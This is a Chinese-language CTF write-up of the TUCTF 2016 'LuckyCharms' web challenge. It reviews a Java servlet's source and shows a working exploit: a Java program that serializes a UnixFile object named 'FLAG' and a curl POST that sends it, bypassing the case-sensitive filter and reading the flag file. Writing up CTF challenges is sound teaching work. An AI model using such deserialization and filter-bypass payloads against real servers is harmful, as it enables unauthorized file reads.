---
layout:     post
title:      "tuctf2016-web-LuckyCharms"
date:       2016-05-30 01:00
category:   writeup
tag:        [tuctf2016,代码审计,文件读取]
---
# 题目信息

`score: 200` `type:web,代码审计，文件读取` `source: tuctf2016`

[原题地址](http://146.148.10.175:1033/LuckyCharms) &emsp;[猜解源码](http://github.com/ssst0n3/ctf-wp/blob/master/2016/tuctf/web/LuckyCharms)
&emsp;[题目收集](http://ctf.a306.xyz:8000/LuckyCharms/LuckyCharms)

## 题目描述

打开网址，一个简单的网页

![](tuctf2016-LuckyCharms-1.png)

## 知识点

servlet
* web.xml
* init(),doGet(),doPost()

curl使用

# 题目分析

## 查看源代码

页面本身没什么特别的，查看源代码发现一段注释

```
<!DOCTYPE html>
<html>
<body>
Frosted Lucky Charms,
<br>
They're magically delicious!
<br>
<img src="https://upload.wikimedia.org/wikipedia/en/f/ff/Lucky-Charms-Cereal-Box-Small.jpg">
<!-- <a href="/?look=LuckyCharms.java"></a> -->
</body>
</html>
```

## 访问链接

访问`view-source:http://ctf.a306.xyz:8000/LuckyCharms/LuckyCharms?look=LuckyCharms.java`,得到`LuckyCharms.java`源代码，由此可知本题为`java代码审计`+`文件内容读取`

![](tuctf2016-LuckyCharms-2.png)

## 分析源码

代码主要是定义了一个读取文件内容的操作，根据windows和unix对大小写是否敏感以及get和post请求的差别进行了区分，设计了一定的过滤规则。我们的任务就是首先分析源码，然后绕过过滤规则

### 定义文件类

定义OSFile类，包含file属性，表示文件名；getFileName函数，在返回文件名之前对文件名做一定的处理

```
abstract class OSFile implements Serializable {
  String file = "";
  abstract String getFileName();
}
```

定义WindowsFile类，继承OSFile，因为windows对大小写不敏感，因此把文件名转换成小写

```
class WindowsFile extends OSFile  {
  public String getFileName() {
    //Windows filenames are case-insensitive
    return file.toLowerCase();
  }
}
```

定义UnixFile类，继承OSFile，因为unix对大小写敏感，因此不用转换

```
class UnixFile extends OSFile {
  public String getFileName() {
    //Unix filenames are case-sensitive, don't change
    return file;
  }
}
```

### 重写doGet(),doPost()

#### 获取文件名

```
OSFile osfile = null;
try {
  //如果将内容以post方式传输，则读取，否则跳至catch
  osfile = (OSFile) new ObjectInputStream(request.getInputStream()).readObject();
} catch (Exception e) {
  //Oops, let me help you out there
  //创建windowsFile,注意这里是对大小写不敏感的
  osfile = new WindowsFile();
  if (request.getParameter("look") == null) {
    osfile.file = "charms.html";
  } else {
    osfile.file = request.getParameter("look");
  }
}
```

#### 过滤以及输出文件内容

```
//对'/'进行转义
String f = osfile.getFileName().replace("/","").replace("\\","");

//如果文件名存在'flag'，则过滤
//注意，contains函数是大小写敏感的

if (f.contains("flag")) {
  //bad hacker!
  out.println("You'll Never Get Me Lucky Charms!");
  return;
}

//将文件名转换成小写形式
try {
  Path path = Paths.get(getServletContext().getRealPath(f.toLowerCase()));
  System.out.print(path);
  String content = new String(java.nio.file.Files.readAllBytes(path));
  out.println(content);
 } catch (Exception e) {
    out.println("Nothing to see here");
 }
```

#### 分析漏洞

我们注意到contains函数是对大小写敏感的，考虑是否能从此绕过

因为get请求创建的是WindowsFile类的对象，因此无法绕过contains()对"flag"的过滤

而UnixFile类没有对文件名进行大小写转换，因此可以使用类似"FLAG"的文件名绕过过滤

而GET请求使用的是WindowsFile类，因此必须通过POST请求传输一个UnixFile对象，该对象的file属性为"FLAG"

#### Exploit
```
import java.io.*;


abstract class OSFile implements Serializable {
  String file = "";
  abstract String getFileName();
}

class UnixFile extends OSFile {
  public String getFileName() {
    //Unix filenames are case-sensitive, don't change
    return file;
  }
}


public class Hax {

    public static void main(String[] args) {
    UnixFile f = new UnixFile();
        f.file = "FLAG";
    try
    {
        FileOutputStream fileOut = new FileOutputStream("/tmp/Hax.bin");
            ObjectOutputStream out = new ObjectOutputStream(fileOut);
            out.writeObject(f);
            out.close();
            fileOut.close();
            System.out.printf("Serialized data is saved in /tmp/Hax.bin\n");
        }catch(IOException i)
        {
            i.printStackTrace();
        }

    }

}
```

```
$ javac Hax.java && java Hax
Serialized data is saved in /tmp/Hax.bin
$file /tmp/Hax.bin
Hax.bin: Java serialization data, version 5
$ curl -X POST --data-binary @Hax.bin 'http://ctf.a306.xyz:8000/LuckyCharms/LuckyCharms'
TUCTF{a_cup_of_joe_keeps_the_hackers_away}
```

# 参考文献

https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/TUCTF/web/LuckyCharms
